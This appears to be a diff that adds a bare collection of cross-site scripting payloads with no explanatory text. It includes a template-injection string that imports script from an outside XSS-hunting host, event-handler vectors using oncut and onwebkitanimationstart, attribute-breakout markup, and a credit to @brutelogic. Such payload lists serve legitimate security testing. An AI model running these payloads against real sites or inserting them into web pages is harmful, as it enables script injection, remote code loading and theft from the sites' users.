@@ -1,0 +1,11 @@
+{{constructor.constructor('import("https://jr0ch17.xss.ht")')()}}
+<x/ oncut=alert(1)>a
+<img src="https://i65.photobucket.com/albums/h214/L_The_Legend/DeathNoteS01E09E.png">
+
+<style> 
+div{width:100px;height:100px;-webkit-animation-name:n;}@-webkit-keyframes n{}
+</style><vulntag attrib=""onwebkitanimationstart=alert(9)><div>
+    
+<!-- @brutelogic -->
+
+"><div class=progress><div onwebkitanimationstart=prompt(document.domain) class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100">
